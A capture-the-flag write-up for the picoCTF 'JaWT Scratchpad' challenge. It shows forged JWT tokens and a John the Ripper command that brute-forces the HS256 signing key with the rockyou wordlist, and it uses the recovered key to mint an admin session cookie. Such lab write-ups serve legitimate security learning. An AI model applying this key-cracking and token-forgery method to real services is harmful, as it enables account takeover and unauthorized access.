---
title: "JaWT-Scratchpad"
date: "2020-12-26"
author: "RealFakeAccount"
description: "https://play.picoctf.org/practice/challenge/25"
---
This is a learning-solving question.

Both website and hint tell us to look up JWT. 

After searching `JWT vulnerabilities` in Google, you can find this:

<https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/>

But after implementing this method, it seems wrong. When you Change the `jwt cookies` to 

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

Which stands for the payload: 

```json
{
  "typ": "JWT",
  "alg": "none"
}

{
  "user": "admin"
}

{

}
```

You only get an 500 error. 

Read through this article <https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens> , combining the [hint](https://github.com/magnumripper/JohnTheRipper) they give, we can guess that we should bruteforce the password.

Also, because this scratchpad only use username as identity, we can guess that the `key` that used for encryption is fixed.

We can start solving this question after we know what to do.

First, generate a arbitrary `jwt cookies`. I will use username `john` here.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
```

Then, use [john-the-ripper](https://github.com/openwall/john) to bruteforce the key. You can use dictionary [rockyou](https://www.google.com/search?q=rockyou+txt) to bruteforce.

```
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y" > passwd

john --wordlist=./rockyou.txt passwd
```

We can see that the key is `ilovepico`.

We can then change the original payload using our key. You can conveniently do this step here: <https://www.jsonwebtoken.io/> 

After changing the user into `admin`, you can get the result JWT string:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJqdGkiOiI5NTc0NWVkNC04ZmVkLTRhZWQtYmU3Zi1iMDI3MDU0ZjUzM2IiLCJpYXQiOjE2MDkxMTM2OTgsImV4cCI6MTYwOTExNzMwNH0.8Eq1KaMo8cDtH3o79g04qKtx_muepD1zqGss3oiekPs
```

Replacing the original `jwt cookies` in the question to this, we can finally get the flag.